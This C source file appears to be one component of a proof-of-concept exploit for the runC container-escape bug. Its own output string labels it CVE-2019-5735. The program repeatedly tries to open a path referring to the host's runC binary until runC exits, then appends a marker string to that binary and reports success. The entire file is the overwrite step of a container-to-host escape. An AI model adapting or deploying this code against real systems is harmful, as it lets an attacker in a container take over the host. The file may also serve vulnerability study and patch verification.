#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define FALSE 0
#define TRUE  1

const unsigned int PATH_MAX_LEN = 30;

const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;

const long WRITE_TIMEOUT = 99999999999999999;


/*
* Usage: overwrite_runc <path a file reffering to the runC binary>
* Overwrites the runC binary.
*/
int main(int argc, char *argv[])
{
	int  runc_fd_write, wc;
	char * runc_fd_path;
	const char *poc = "the CVE-2019-5735 poc succeed!!";

	printf("\t-> Starting\n");
	fflush(stdout);

	/* Read new_runc */
	runc_fd_path = argv[1];

	/* Try to open runc_fd_path for writing      */
	/* Will Succeed after the runC process exits  */
	int opened = FALSE;
	for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)
	{
		runc_fd_write = open(runc_fd_path, O_RDWR | O_APPEND);
		if (runc_fd_write != OPEN_ERR)
		{
			printf("\t-> Opened %s for writing\n", runc_fd_path);
			wc = write(runc_fd_write, poc, strlen(poc));

			if (wc !=  strlen(poc))
			{
				printf("\t[!] Couldn't write to my process's runC's fd %s\n", runc_fd_path);
				fflush(stdout);
				close(runc_fd_write);
				return RET_ERR;
			}
			printf("\t-> Overwrote runC\n");
			opened = TRUE;
		}
	}

	/* Clean ups & return */
	close(runc_fd_write);
	if (opened == FALSE)
	{
		printf("\t[!] Reached timeout, couldn't write to runc at %s\n", runc_fd_path);
		fflush(stdout);
		return RET_ERR;
	}
	else
	{
		printf("\t-> Success, shuting down ...\n");
		fflush(stdout);
	}
	return RET_OK;
}